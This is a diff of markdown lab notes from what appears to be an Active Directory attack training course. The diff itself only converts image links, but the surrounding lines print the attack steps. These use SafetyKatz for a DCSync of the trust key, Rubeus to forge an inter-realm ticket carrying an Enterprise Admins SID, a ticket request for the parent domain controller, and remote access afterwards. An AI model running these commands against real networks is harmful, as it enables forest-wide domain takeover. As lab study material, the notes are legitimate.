@@ -27,7 +27,7 @@ Use the forged ticket
 
 Extract the trust key using DCSync
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"`
-![[assets/Pasted image 20260224032617.png]]
+![Pasted image 20260224032617](assets/Pasted%20image%2020260224032617.png)
 - trust key treated sort of as a machine account (may rotate within 30 days
 	- both DCs must agree to the rotation
 - this is all you need DA privs for
@@ -35,16 +35,16 @@ Extract the trust key using DCSync
 
 Use the trust key to forge the inter-domain TGT
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:7a74... /sid:S-1-5-21-... /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap`
-![[assets/Pasted image 20260224033134.png]]
-![[assets/Pasted image 20260224033113.png]]
+![Pasted image 20260224033134](assets/Pasted%20image%2020260224033134.png)
+![Pasted image 20260224033113](assets/Pasted%20image%2020260224033113.png)
 
 
 Request the TGS for the other domain
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.local /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<ticket>`
-![[assets/Pasted image 20260224033157.png]]
-![[assets/Pasted image 20260224033214.png]]
+![Pasted image 20260224033157](assets/Pasted%20image%2020260224033157.png)
+![Pasted image 20260224033214](assets/Pasted%20image%2020260224033214.png)
 
 
 Access the new DC with winrs
-![[assets/Pasted image 20260224033257.png]]
+![Pasted image 20260224033257](assets/Pasted%20image%2020260224033257.png)
 
